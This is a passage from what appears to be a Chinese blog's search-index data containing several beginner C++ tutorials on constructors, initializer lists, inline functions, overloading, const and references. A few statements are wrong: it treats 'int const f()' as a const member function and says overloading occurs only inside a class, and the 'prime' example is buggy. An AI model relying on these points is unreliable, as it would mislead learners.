&amp;obj) { _a = obj._a; _b = obj._b; }}; 默认的构造函数C++ 中有两个特殊的构造函数： 默认无参构造函数：当类中没有定义构造函数时，编译器默认会提供一个无参构造函数，并且其函数体为空 默认拷贝构造函数：当类中没有定义拷贝构造函数时，编译器默认会提供一个拷贝构造函数，用于简单地进行类成员变量的值复制 构造函数的调用方式构造函数的调用方式分为以下三种： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;iostream&gt;using namespace std;class Test {private: int _a; int _b;public: Test() { _a = 1; _b = 1; } Test(int a) { _a = a; _b = 3; } Test(int a, int b) { _a = a; _b = b; }public: int getA() const { return _a; } int getB() const { return _b; }};int main() { // 第一种：C++编译器调用有参构造函数(等号法) Test t1 = (1, 2, 3, 4, 5); printf("a = %d, b = %d\\n", t1.getA(), t1.getB()); // 第二种：C++编译器调用有参构造函数(括号法) Test t2(10, 20); printf("a = %d, b = %d\\n", t2.getA(), t2.getB()); // C++编译器调用无参构造函数 Test t0; printf("a = %d, b = %d\\n", t0.getA(), t0.getB()); // 第三种：手动调用构造函数生成一个对象(直接调用构造函数法) Test t3 = Test(100, 200); printf("a = %d, b = %d\\n", t3.getA(), t3.getB()); return 0;} 程序运行输出的结果如下： 1234a = 5, b = 3a = 10, b = 20a = 1, b = 1a = 100, b = 200 拷贝构造函数的调用场景第一种调用场景123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;iostream&gt;using namespace std;class Test {private : int _a;public: Test() { cout &lt;&lt; "无参构造函数自动被调用了" &lt;&lt; endl; } Test(int a) { _a = a; cout &lt;&lt; "有参构造函数被调用了" &lt;&lt; endl; } Test(const Test &amp;obj) { _a = obj._a + 10; cout &lt;&lt; "拷贝构造函数被调用了" &lt;&lt; endl; } ~Test() { cout &lt;&lt; "析构函数被调用了" &lt;&lt; endl; } int getA() { return _a; }};void functionA() { Test t1(1); Test t0(2); t0 = t1; // 普通的赋值操作，拷贝构造函数不会被调用 Test t2 = t1; // 类的初始化操作(等号法)，拷贝构造函数会被调用 cout &lt;&lt; "a = " &lt;&lt; t2.getA() &lt;&lt; endl;}int main() { functionA(); return 0;} 程序运行输出的结果如下： 1234567有参构造函数被调用了有参构造函数被调用了拷贝构造函数被调用了a = 11析构函数被调用了析构函数被调用了析构函数被调用了 第二种调用场景12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;iostream&gt;using namespace std;class Test {private : int _a;public: Test() { cout &lt;&lt; "无参构造函数自动被调用了" &lt;&lt; endl; } Test(int a) { _a = a; cout &lt;&lt; "有参构造函数被调用了" &lt;&lt; endl; } Test(const Test &amp;obj) { _a = obj._a + 10; cout &lt;&lt; "拷贝构造函数被调用了" &lt;&lt; endl; } ~Test() { cout &lt;&lt; "析构函数被调用了" &lt;&lt; endl; } int getA() { return _a; }};void functionA() { Test t1(3); Test t2(t1); // 类的初始化操作(括号法)，拷贝构造函数会被调用 cout &lt;&lt; "a = " &lt;&lt; t2.getA() &lt;&lt; endl;}int main() { functionA(); return 0;} 程序运行输出的结果如下： 12345有参构造函数被调用了拷贝构造函数被调用了a = 13析构函数被调用了析构函数被调用了 第三种调用场景12345678910111213141516171819202122232425262728293031323334353637383940414243#include "iostream"using namespace std;class Location {private : int X, Y;public: Location(int xx = 0, int yy = 0) { X = xx; Y = yy; cout &lt;&lt; "有参构造函数被调用了" &lt;&lt; endl; } Location(const Location &amp;p) { X = p.X; Y = p.Y; cout &lt;&lt; "拷贝构造函数被调用了" &lt;&lt; endl; } ~Location() { cout &lt;&lt; "析构函数被调用了" &lt;&lt; endl; } int getX() { return X; } int getY() { return Y; }};void functionA(Location b) { cout &lt;&lt; b.getX() &lt;&lt; "," &lt;&lt; b.getY() &lt;&lt; endl;}int main() { Location a(1, 2); functionA(a); // 拷贝构造函数会被调用，这里会使用实参变量（a）初始化形参变量（b），同时会多创建一个Location对象（匿名对象），所以最后析构函数会被调用两次 return 0;} 程序运行输出的结果如下： 12345有参构造函数被调用了拷贝构造函数被调用了1,2析构函数被调用了析构函数被调用了 第四种调用场景1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &lt;iostream&gt;using namespace std;class Location {private : int x, y;public: Location(int xx = 0, int yy = 0) { x = xx; y = yy; cout &lt;&lt; "有参构造函数被调用了" &lt;&lt; endl; } Location(const Location &amp;p) { x = p.x; y = p.y; cout &lt;&lt; "拷贝构造函数被调用了" &lt;&lt; endl; } ~Location() { cout &lt;&lt; "析构函数被调用了" &lt;&lt; endl; } int getX() { return x; } int getY() { return y; }};Location functionA() { Location l(1, 2); return l;}int main() { // 匿名对象的去与留，关键是看返回匿名对象时如何接收，一般有以下两种情况： // 若将函数functionA()返回的匿名对象，赋值给另外一个同类型的对象，那么匿名对象会被析构 // 此时有参构造函数和析构函数被调用两次 Location A; A = functionA(); // 若使用函数functionA()的匿名对象，来初始化另外一个同类型的对象，那么匿名对象会直接转成B对象 // 此时有参构造函数与析构函数各被调用一次 // Location B = functionA(); return 0;} 程序运行输出的结果如下： 1234有参构造函数被调用了有参构造函数被调用了析构函数被调用了析构函数被调用了 思考：在上述的代码中，在 main() 函数内直接调用 functionA() 函数时，为什么拷贝构造函数没有被调用呢？是否跟 C++ 编译器的版本有关系呢？ 构造函数的使用规则 当类中没有定义任何一个构造函数时，C++ 编译器会提供默认无参构造函数和默认拷贝构造函数 当类中定义了拷贝构造函数时，C++ 编译器不会提供默认无参构造函数 当类中定义了任意的非拷贝构造函数（即当类中定义了有参构造函数或无参构造函数），C++ 编译器不会提供默认无参构造函数 C++ 提供的默认拷贝构造函数，只负责给类成员变量简单赋值 必要的时候，需要手动编写拷贝构造函数 构造函数和普通成员函数都遵循函数重载规则 构造函数初始化列表初始化列表出现的原因有的时候必须用带有初始化列表的构造函数：（1）没有默认无参构造函数的成员类对象；（2）const 成员或引用类型的成员，必须要通过初始化列表进行初始化，因为这两种对象要在声明后马上初始化，而在构造函数中，做的就是对它们赋值，这样是不被允许的。值得一提的是，构造函数中有着比我们所看见的还要多的细节，构造函数可以调用其它的构造函数来初始化对象中的基类对象和成员对象的构造函数。类的数据成员中的其它类对象，若该成员对象是没有默认无参构造函数，则必须进行显式初始化；因为编译器会隐式调用成员对象的默认无参构造函数，而它又没有默认无参构造函数，则编译器会编译失败。 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;iostream&gt;using namespace std;class Teacher {private : int _age;public: Teacher(int age) { _age = age; } int getAge() const { return _age; }};class Student {private : int _age; Teacher teacher;public: int getAge() const { return _age; }};int main() { Teacher t(20); Student s; // C++编译器编译不通过 return 0;} 上述示例代码无法通过编译，Student 的类数据成员中有一个 Teacher 类的对象 teacher，创建 Student 类时，要先创建其成员对象 teacher；由于 Teacher 类有一个自定义的有参构造函数，C++ 编译器不会再提供默认无参构造函数，因此 teacher 对象无法被自动创建。使用构造函数初始化列表改写后，正确的示例代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;iostream&gt;using namespace std;class Teacher {private : int _age;public: Teacher(int age) { _age = age; } int getAge() const { return _age; }};class Student {private : int _age; Teacher teacher;public: // 使用构造函数的初始化列表来初始化Teacher类对象 // 这里会自动调用Teacher类的有参构造函数，并将age2作为构造函数的参数传递过去 Student(int age1, int age2) : teacher(age2) { _age = age1; } int getAge() const { return _age; } Teacher getTeacher() { return teacher; }};int main() { Student s(20, 35); cout &lt;&lt; "student.age: " &lt;&lt; s.getAge() &lt;&lt; ", teacher.age: " &lt;&lt; s.getTeacher().getAge() &lt;&lt; endl; return 0;} 程序运行的输出结果如下： 1student.age: 20, teacher.age: 35 初始化列表使用的语法规则构造函数初始化列表以一个冒号开始，接着是以逗号分隔的数据成员列表，每个数据成员后面跟一个放在括号中的初始化式。 1234Constructor::Contructor() : m1(v1), m2(v1,v2), m3(v3){} 在下述的示例代码中，两个构造函数的最终效果是一样的。使用初始化列表的构造函数是显式地初始化类的成员；而没有使用初始化列表的构造函数是对类的成员赋值，并没有显式地初始化。 12345678910111213141516171819class A{public: int a; float b; A(): a(0),b(9.9) {} //构造函数初始化列表};class A{public: int a; float b; A() //构造函数内部赋值 { a = 0; b = 9.9; }}; 初始化 const 成员和引用成员构造函数初始化列表是初始化 const 成员和引用成员的唯一方式。因为 const 成员或引用类型的成员只能被初始化，不能对它们赋值。示例代码如下： 12345678910111213141516171819202122232425#include &lt;iostream&gt;using namespace std;class A {private: int i; int &amp;j; const int c;public: // 构造函数初始化列表 A(int x, int y) : c(x), j(y) { i = -1; }};int main() { int m; A a(5, m); // C++编译可以通过 return 0;} 若不通过初始化列表来对 const 成员或引用类型的成员进行初始化，那么缺省情况下，在构造函数被执行之前，对象中的所有成员都已经被它们自己的默认无参构造函数初始化了。由于这两种数据成员要在声明后马上初始化，而在构造函数中，做的就是对它们赋值，这样是不被允许的。示例代码如下： 1234567891011121314151617181920212223#include &lt;iostream&gt;using namespace std;class A {private: int i; int &amp;j; const int c;public: A(int x) { i = -1; c = 5; // C++编译不通过，必须通过初始化列表来初始化 j = x; // C++编译不通过，必须通过初始化列表来初始化 }};int main() { A a(3); return 0;} 当类中某个数据成员本身也是一个类对象时，应该尽量避免使用赋值操作来对该成员进行初始化，示例代码如下： 1234567891011class Person{private: string name;public: Person(string &amp; n) { name = n; }} 虽然这样的构造函数也能得到正确的结果，但这样写效率并不高。当一个 Person 对象创建时，string 类成员对象 name 先会被默认无参构造函数进行初始化，然后在 Person 类的自定义有参构造函数中，它的值又会因赋值操作而再改变一次。这里可以通过初始化列表来显示地对 name 对象进行初始化，这样就可以将前面的两步骤（初始化和赋值）合并成一个步骤了。示例代码如下： 12345678910class Person{private: string name;public: Person(string&amp; n): name(n){ }} 初始化与赋值的区别重点知识点： 初始化：被初始化的对象正在创建 赋值：被赋值的对象已经存在 初始化列表优先于构造函数的执行 成员变量的初始化顺序与声明的顺序相关，与在初始化列表中的顺序无关 在宏观代码上，两者作用相同。对于数组和结构体来说，初始化和赋值的的形式不同。对于数组，可以使用花括号一起初始化，如果赋值的话，就只能单个元素就行；对于结构体，可以使用花括号初始化，否则只能通过 . 来访问变量进行赋值。 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;struct MyStruct { int aa; float bb; string cc;};int main() { int a[3] = {1, 2, 3}; int b[3]; b[0] = 1; b[1] = 2; b[2] = 3; MyStruct stu1 = {1, 3.14f, "hello world"}; MyStruct stu2; stu2.aa = 1; stu2.bb = 3.14f; stu2.cc = "we are csdn"; cout &lt;&lt; stu1.aa &lt;&lt; endl; cout &lt;&lt; stu1.bb &lt;&lt; endl; cout &lt;&lt; stu1.cc &lt;&lt; endl; return 0;} 构造函数和析构函数的调用顺序 当类中有成员变量是其它类的对象时，首先调用成员变量的构造函数，调用顺序与声明顺序相同，之后再调用类自身的构造函数 析构函数的调用顺序与对应的构造函数调用顺序相反 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"c++"},{title:"C++ 入门基础之三",url:"/posts/f26087ad.html",text:'C++ 对 C 语言的函数扩展内联函数什么是内联函数在 C 语言中，使用宏定义函数这种借助编译器的优化技术来减少程序的执行时间，那么在 C++ 中有没有相同的技术或者更好的实现方法呢？答案是有的，那就是内联函数。内联函数作为编译器优化手段的一种技术，在降低程序运行时间上非常有用。C++ 的内联函数是通常与类一起使用。如果一个函数是内联的，那么在编译时，编译器会把该函数的代码副本放置在每个调用该函数的地方。对内联函数进行任何修改，都需要重新编译函数的所有客户端，因为编译器需要重新更换一次所有的代码，否则将会继续使用旧的函数。如果想把一个函数定义为内联函数，则需要在函数名前面放置关键字 inline，在调用函数之前需要对函数进行定义。所有在类中定义的函数都是内联函数，即使没有使用 inline 关键字声明。当内联函数收到编译器的指示时，即可发生内联：编译器将使用函数的定义体来替代函数调用语句，这种替代行为发生在编译阶段而非程序运行阶段。值得一提的是，内联函数仅仅是对编译器的内联建议，编译器是否觉得采取建议取决于函数是否符合内联的有利条件。如何函数体非常大，那么编译器将忽略函数的内联声明，而将内联函数作为普通函数处理。 为什么要使用内联函数有时候我们会写一些功能专一的函数，这些函数的函数体不大，包含了很少的执行语句。例如在计算 1~1000 以内的素数时，我们经常会使用开方操作使运算范围缩小，这时我们会写如下一个函数： 1234int root(int n){ return (int)sqrt((float)n);} 然后求范围内素数的函数可以这样写： 12345678910int prime(int n){ int i; for (i = 2; i &lt;= root(n); i++) { if (n%i == 0) return 0; return 1; }} 当然，把 root 函数放在循环中不是个不明智的选择，但想象一下，在某个程序上下文内必须频繁地调用某个类似 root 的函数，其调用函数的花销会有多大：当遇到普通函数的调用指令时，程序会保存当前函数的执行现场，将函数中的局部变量以及函数地址压入堆栈，然后再将即将调用的新函数加载到内存中，这要经历复制参数值、跳转到所调用函数的内存位置、执行函数代码、存储函数返回值等过程；当函数执行完后，再获取之前正在调用的函数的地址，回去继续执行那个函数，运行时间开销简直太多了。为了解决上述问题，C++ 内联函数提供了替代函数调用的方案，通过 inline 声明，编译器首先在函数调用处使用函数体本身语句替换了函数调用语句，然后编译替换后的代码。因此，通过内联函数，编译器不需要跳转到内存其他地址去执行函数调用，也不需要保留函数调用时的现场数据。 如何使用内联函数12345678910111213141516171819202122#include &lt;iostream&gt;using namespace std;// 宏定义函数的声明#define MAXFUNC(x, y) (x &gt; y) ? x : y// 内联函数的声明inline int Max(int x, int y) { return (x &gt; y) ? x : y;}int main() { // 内联函数的调用 cout &lt;&lt; "Max (20,10): " &lt;&lt; Max(20, 10) &lt;&lt; endl; cout &lt;&lt; "Max (0,200): " &lt;&lt; Max(0, 200) &lt;&lt; endl; cout &lt;&lt; "Max (100,1010): " &lt;&lt; Max(100, 1010) &lt;&lt; endl; // 宏定义函数的调用 printf("Max (10,30): %d\\n", MAXFUNC(10, 30)); return 0;} 程序运行的输出结果如下： 1234Max (20,10): 20Max (0,200): 200Max (100,1010): 1010Max (10,30): 30 内联函数的优缺点优点： 它通过避免函数调用所带来的开销来提高程序的运行速度 通过将函数声明为内联，则可以把函数定义放在头文件内 它避免了普通函数调用时的额外开销（压栈、弹栈、跳转、返回） 缺点： 因为代码的扩展，内联函数增大了可执行程序的体积 C++ 内联函数的展开是编译阶段，这就意味着如果内联函数发生了改动，那么就需要重新编译代码 当把内联函数放在头文件中时，它将会使头文件信息变多，不过头文件的使用者不用在意这些细节 有时候内联函数并不受到青睐，比如在嵌入式系统中，嵌入式系统的存储约束可能不允许体积很大的可执行程序运行 内联函数的编译限制C++ 中内联函数编译的限制： 函数体不能过于庞大 不能对函数进行取址操作 不能存在任何形式的循环语句 不能存在过多的条件判断语句 函数的内联声明必须在调用语句之前 编译器对于内联函数的限制并不是绝对的，内联函数相对于普通函数的优势只是省去了函数调用时压栈、弹栈、跳转和返回的开销。因此，当函数体的执行开销远大于压栈、弹栈、跳转和返回所用的开销时，那么内联将变得毫无意义。 什么时候该使用内联函数当程序设计需要时，每个函数都可以声明为 inline，下面列举一些有用的建议： 当对程序执行性能有要求时，那么就可以使用内联函数 当想使用宏定义一个函数时，那就果断使用内联函数来替代 在类内部定义的函数会默认声明为 inline 函数，这有利于类实现细节的隐藏 关键点： 虚函数不允许内联 所有在类中定义的函数都默认声明为 inline 函数，所有不用再显示地去声明 inline 虽然说模板函数放中头文件中，但它们不一定是内联的（不是说定义在头文件中的函数都是内联函数） C++ 编译器会直接将编译后的内联函数体插入到调用的地方，内联函数在最终生成的代码中是没有定义的 内联函数由编译器处理，直接将编译后的内联函数体插入到调用的地方；而宏定义由预处理器处理，只进行简单的文本替换，没有任何编译过程 一些现代的 C++ 编译器提供了扩展语法，能够对函数进行强制内联，例如： g++ 中的 __attribute__((always_inline)) 属性 编译器的内联看起来就像是代码的复制与粘贴，但这与预处理宏是很不同的；宏定义函数是强制的内联展开，可能将会污染所有的命名空间与代码，会为程序的调试带来困难 内联声明只是一种对编译器的建议，编译器是否采用内联措施由编译器自己来决定。现代 C++ 编译器能够进行编译优化，甚至在汇编阶段或链接阶段，一些没有 inline 声明的函数，也可能被编译器内联编译 函数默认参数C++ 中可以在函数声明时为参数提供一个默认值，当函数调用时没有指定这个参数的值，编译器会自动用默认值代替。函数默认参数的使用规则如下： 只有参数列表后面部分的参数才可以提供默认参数值 一旦在一个函数调用中开始使用默认参数值，那么这个参数后的所有参数都必须使用默认参数值 12345678910111213141516171819#include &lt;iostream&gt;using namespace std;void funcA(int x = 3) { printf("x: %d\\n", x);}void funcB(int a, int b, int y = 4, int z = 5) { printf("a: %d, b: %d, y: %d, z: %d\\n", a, b, y, z);}int main() { funcA(); funcA(6); funcB(1, 2); funcB(1, 2, 3, 4); return 0;} 程序运行的输出结果如下： 1234x: 3x: 6a: 1, b: 2, y: 4, z: 5a: 1, b: 2, y: 3, z: 4 函数占位参数函数占位参数只有参数类型声明，而没有参数名声明；一般情况下，在函数体内部无法使用占位参数。 123456789101112#include &lt;iostream&gt;using namespace std;int func(int a, int b, int) { return a + b;}int main() { printf("func(1, 2, 3) = %d\\n", func(1, 2, 3)); return 0;} 程序运行的输出结果如下： 1func(1, 2, 3) = 3 函数默认参数结合函数占位参数 可以将函数默认参数与函数占位参数结合起来使用，其意义在于为以后程序的扩展留下空间，并兼容 C 语言代码中可能出现的不规范写法。 12345678910111213#include &lt;iostream&gt;using namespace std;void func(int a, int b, int = 0) { printf("a + b = %d\\n", a + b);}int main() { func(1, 2); func(1, 2, 3); return 0;} 程序运行的输出结果如下： 12a + b = 3a + b = 3 函数重载函数重载的概念函数重载概念（Function Overload）： 用同一个函数名定义不同的函数 当函数名和不同的参数搭配时函数的含义不同 函数重载至少满足下面的一个条件（函数重载的判断标准）： 参数个数不同 参数类型不同 参数顺序不同 特别注意： 函数的返回值不是函数重载的判断标准 函数重载的使用12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;#include &lt;string.h&gt;using namespace std;int func(int x) { return x;}int func(int a, int b) { return a + b;}int func(const char *s) { return strlen(s);}int main() { int c = 0; c = func(1); printf("c = %d\\n", c); c = func(1, 2); printf("c = %d\\n", c); c = func("12345"); printf("c = %d\\n", c); return 0;} 程序运行的输出结果如下： 123c = 1c = 3c = 5 函数重载的调用准则编译器调用重载函数的准则： 将所有同名函数作为候选者 尝试寻找可行的候选函数 精确匹配实参 通过默认参数能够匹配实参 通过默认类型转换匹配实参 匹配失败 最终寻找到的可行候选函数不唯一，则出现二义性，编译失败 无法匹配所有候选者，函数未定义，编译失败 函数重载的注意事项： 重载函数的函数类型是不同的 函数重载是发生在一个类中里面的 函数的返回值不能作为函数重载的依据 函数重载是由函数名和参数列表决定的 重载函数在本质上是相互独立的不同函数 函数重载与函数指针当使用重载函数名对函数指针进行赋值时： 根据重载规则挑选与函数指针参数列表一致的候选者 严格匹配候选者的函数类型与函数指针的函数类型 1234567891011121314151617181920212223242526272829303132333435#include &lt;iostream&gt;#include &lt;string.h&gt;using namespace std;int func(int x) { return x;}int func(int a, int b) { return a + b;}int func(const char *s) { return strlen(s);}// 第一种写法：声明函数类型typedef int (FUNC)(int a);// 第二种写法：声明函数指针类型typedef int(*PFUNC)(int a, int b);int main() { // 根据上面的第一种写法，定义函数指针类型的变量 FUNC *FUNC = func; int c = FUNC(1); printf("c = %d\\n", c); // 根据上面的第二种写法，定义函数指针类型的变量 PFUNC p = func; int d = p(3, 4); printf("d = %d\\n", d); return 0;} 程序运行的输出结果如下： 12c = 1d = 7 函数重载与函数默认参数当函数重载遇上函数默认参数时，如果代码存在二义性，那么 C++ 编译器会编译失败，示例代码如下： 12345678910111213141516171819202122#include &lt;iostream&gt;using namespace std;int func(int a, int b, int c = 0) { return a * b * c;}int func(int a, int b) { return a + b;}int func(int a) { return a;}int main() { int c = 0; // c = func(1, 2); // 存在二义性，调用失败，编译不能通过 printf("c = %d\\n", c); return 0;} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"c++"},{title:"C++ 入门基础之二",url:"/posts/b03c11a0.html",text:'const 关键字const 简介const 是 constant 的缩写，本意是不变的，不易改变的意思。在 C++ 中是用来修饰内置类型变量、自定义对象、成员函数、返回值、函数参数。C++ 的 const 关键字允许指定一个语义约束，编译器会强制实施这个约束，允许程序员告诉编译器某值是保持不变的。如果在编程中确实有某个值保持不变，就应该明确使用 const，这样可以获得编译器的帮助。 1234567891011#include &lt;iostream&gt;using namespace std;int main() { const int a = 7; int *p = (int *) &amp;a; *p = 8; cout &lt;&lt; a &lt;&lt; " "&lt;&lt; *p; return 0;} 在上述代码中，对于 const 变量 a，我们取变量的地址并转换赋值给 指向 int 的指针，然后利用 *p = 8; 重新赋值，然后输出查看 a 的值，程序运行的输出结果如下： 17 8 从结果中可以看到，编译器认为 a 的值为一开始定义的 7，所以对 const a 的操作就会产生上面的情况。所以千万不要轻易对 const 变量赋值，这会产生意想不到的行为。C++ 编译器对 const 常量的处理机制是，当碰见常量声明时，往符号表中放入常量；在编译过程中若发现使用常量，则直接以符号表中的值替换，例如在编译过程中若发现对 const 常量使用了 extern 或者 &amp; 操作符，则会给对应的常量单独分配内存空间（兼容 C 语言），这也是上述代码中打印 *p 的值为 8 的原因，点击查看原理分析图。 如果不想让编译器察觉到上面对 const 变量的操作，我们可以在 const 前面加上 volatile 关键字。volatile 关键字跟 const 刚好相反，是易变的，容易改变的意思；所以不会被编译器优化，编译器也就不会改变对 a 变量的操作。 1234567891011#include&lt;iostream&gt;using namespace std;int main() { volatile const int a = 7; int *p = (int *) &amp;a; *p = 8; cout &lt;&lt; a &lt;&lt; " " &lt;&lt; *p; return 0;} 程序运行的输出结果如下： 18 8 const 参数传递对于 const 修饰函数参数可以分为三种情况： A：值传递的 const 修饰传递，一般这种情况不需要 const 修饰，因为函数会自动产生临时变量复制实参值。 123456789101112131415#include &lt;iostream&gt;using namespace std;void Cpf(const int a){ cout &lt;&lt; a; // ++a; 是错误写法，a 不能被改变}int main(){ Cpf(8); return 0;} B：当 const 参数为指针时，可以防止指针被意外篡改。 123456789101112131415#include &lt;iostream&gt;using namespace std;void Cpf(int *const a) { cout &lt;&lt; *a &lt;&lt; endl; // a 为 8 *a = 9;}int main() { int a = 8; Cpf(&amp;a); cout &lt;&lt; a &lt;&lt; endl; // a 为 9 return 0;} C：自定义类型的参数传递，需要使用临时对象复制参数，对于临时对象的构造，需要调用拷贝构造函数，比较浪费资源，因此可以采取 const 外加引用传递的方式。并且对于一般的 int、double 等内置类型，不需要采用引用的传递方式。 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;using namespace std;class Test {private: int _cm;public: Test() {} Test(int _m) : _cm(_m) {} int get_cm() const { return _cm; }};void Cmf(const Test &amp; _tt) { cout &lt;&lt; _tt.get_cm();}int main() { Test t(8); Cmf(t); return 0;} 程序运行的输出结果如下： 18 const 函数返回值对于 const 修饰函数的返回值可以分三种情况： A：const 修饰内置类型（如 int、double）的返回值，修饰与不修饰返回值的作用都一样。 12345678910111213141516171819#include &lt;iostream&gt;using namespace std;const int Cmf() { return 1;}int Cpf() { return 0;}int main() { int _m = Cmf(); int _n = Cpf(); cout &lt;&lt; _m &lt;&lt; " " &lt;&lt; _n; // 输出结果为：1 0 return 0;} B：const 修饰自定义类型的作为返回值，此时返回的值不能作为左值使用，既不能被赋值，也不能被修改。 C：const 修饰返回的指针或者引用，是否返回一个指向 const 的指针，取决于我们想让用户干什么。 const 修饰指针变量const 修饰指针变量有以下三种情况： A： const 修饰指针指向的内容，则内容为不可变量。 B： const 修饰指针，则指针为不可变量。 C： const 修饰指针和指针指向的内容，则指针和指针指向的内容都为不可变量。 对于 A，则指针指向的内容不可改变，简称左定值，因为 const 位于 * 号的左边。 12345int a = 10;int b = 20;const int *p = &amp;a;p = &amp;b; // 正确写法*p = 10; //错误写法 对于 B， const 指针 p 其指向的内存地址不能够被改变，但其内容可以改变。简称右定向，因为 const 位于 * 号的右边。 12345int a = 8;int * const p = &amp;a;*p = 9; // 正确写法int b = 7;p = &amp;b; // 错误写法 对于 C，则是 A 和 B 合并的结果，即 const p 指向的内容和指向的内存地址都已固定，不可改变。 12int a = 8;const int * const p = &amp;a; 对于 A、B、C 三种情况，根据 const 位于 * 号的位置不同，可以总结三句便于记忆的话： 左定值，右定向，const 修饰不变量。 const 修饰类成员函数const 修饰类成员函数，其目的是防止成员函数修改被调用对象的值，如果我们不想修改一个调用对象的值，所有的成员函数都应当声明为 const 成员函数，此时 const 本质上修饰的是 this 指针。值得一提的是，const 关键字不能与 static 关键字同时使用，因为 static 关键字修饰静态成员函数，而静态成员函数不含有 this 指针，即不能实例化，但 const 成员函数必须关联某一对象实例。 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;using namespace std;class Test {private: int _cm;public: Test() {} Test(int _m) : _cm(_m) {} int get_cm() const { // _cm = 10; 是错误写法，对象的_cm属性值不能被改变 return _cm; }};void Cmf(const Test &amp; _tt) { cout &lt;&lt; _tt.get_cm();}int main() { Test t(8); Cmf(t); return 0;} 程序运行的输出结果如下： 18 上面的 int get_cm() const {} 函数用到了 const 成员函数，如果 int get_cm() {} 去掉 const 修饰，则 Cmf 函数传递的 const _tt 即使没有改变对象的值，编译器也认为函数 int get_cm() {} 会改变对象的值，所以我们尽量按照要求将所有的不需要改变对象内容的函数都作为 const 成员函数。下述两种的写法都是合法的，效果都一样，C++ 中一般将 const 写在函数的末尾处。 123456int get_cm() const {}int const get_cm() {} 如果有个成员函数想修改对象中的某一个成员怎么办？这时我们可以使用 mutable 关键字修饰这个成员，mutable 的意思也是易变的，容易改变的意思，被 mutable 关键字修饰的成员可以处于不断变化中，如下面的例子： 123456789101112131415161718192021222324#include &lt;iostream&gt;using namespace std;class Test {public: int _cm; mutable int _ct;public: Test(int _m, int _t) : _cm(_m), _ct(_t) {} void Kf() const { // ++_cm; 错误写法 ++_ct; // 正确写法 }};int main() { Test t(8, 7); t.Kf(); cout &lt;&lt; t._cm &lt;&lt; " " &lt;&lt; t._ct &lt;&lt; endl; return 0;} 程序运行的输出结果如下： 18 8 这里在函数 void Kf() const {} 中可以通过 ++_ct; 修改 _ct 的值，但是通过 ++_cm 修改 _cm 则会报错，因为 _cm 没有用 mutable 修饰。 const 和 #define 的区别C++ 中不但可以用 #define 定义常量还可以用 const 定义常量，例如 const int c = 5; ≈ #define c 5，它们的区别如下： 用 #define MAX 255 定义的常量是没有类型的，所给出的是一个立即数，编译器只是把所定义的常量值与所定义的常量的名字联系起来，#define 所定义的宏变量在编译器执行预处理的时候进行替换，在程序中使用到该常量的地方都要进行拷贝替换 用 const float MAX = 255; 定义的常量有类型名字，存放在内存的静态区域中，在程序运行过程中 const 变量只有一个拷贝，而 #define 所定义的宏变量却有多个拷贝，所以宏定义在程序运行过程中所消耗的内存要比 const 变量的大得多 用 #define 定义的常量是不可以用指针变量去指向的，用 const 定义的常量是可以用指针去指向该常量的地址 用 #define 可以定义一些简单的函数，const 是不可以定义函数 编译器处理方式： #define – 在编译器的预处理阶段进行单纯的文本替换 const – 在编译器的编译阶段确定其值 类型检查： #define – 无类型，不进行类型安全检查，可能会产生意想不到的错误 const – 有数据类型，编译时会进行类型与作用域检查 内存空间： #define – 不分配内存，给出的是立即数，有多少次使用就进行多少次替换，在内存中会有多个拷贝，消耗内存大 const – 在静态存储区中分配空间，在程序运行过程中内存中只有一个拷贝 其他方面： 在编译时，编译器通常不为 const 常量分配内存空间，而是将它们保存在符号表中，这使得它成为一个编译期间的常量，没有了存储与读内存的操作，使得它的效率也很高。#define 宏替换只作替换，不做计算，不做表达式求解 宏定义的作用范围仅限于当前文件，默认状态下，const 常量只在文件内有效，当多个文件中出现了同名的 const 常量时，等同于在不同文件中分别定义了独立的常量。如果想在多个文件之间共享 const 常量，必须在常量定义之前添加 extern 关键字（在声明和定义时都要添加） C 语言与 C++ 的 const 对比C 语言的 const 变量： C 语言中 const 变量是只读变量，有自己的内存空间 C 语言中，可以通过操作指针的方式来修改 const 变量的值 C++ 的 const 常量： 可能分配内存空间，也可能不分配内存空间 当使用 &amp; 操作符取 const 常量的地址时，会分配内存空间 当 const 常量为全局，并且需要在其它文件中使用，会分配内存空间 当 const int &amp;a = 10;，即 const 修饰引用时，也会分配内存空间 注意：C++ 编译器虽然可能为 const 常量分配内存空间，但不会使用其内存空间中的值，同时是在编译器的编译阶段分配内存空间 引用（普通引用）变量名回顾 变量名实质上是一段连续内存空间的别名，是一个标号（门牌号） 程序中通过变量来申请并命名内存空间 通过变量的名称可以使用内存空间 引用的概念在 C++ 中新增加了引用的概念： a) 引用可以看作一个已定义变量的别名 b) 引用的语法：Type &amp; name = var; c) 引用作为函数参数声明时，不会进行初始化 d) 普通引用在声明时必须用其它的变量进行初始化 123456789101112131415161718#include &lt;iostream&gt;using namespace std;int main() {{ int a = 10; // 编译器分配4个字节的内存空间，a是内存空间的别名 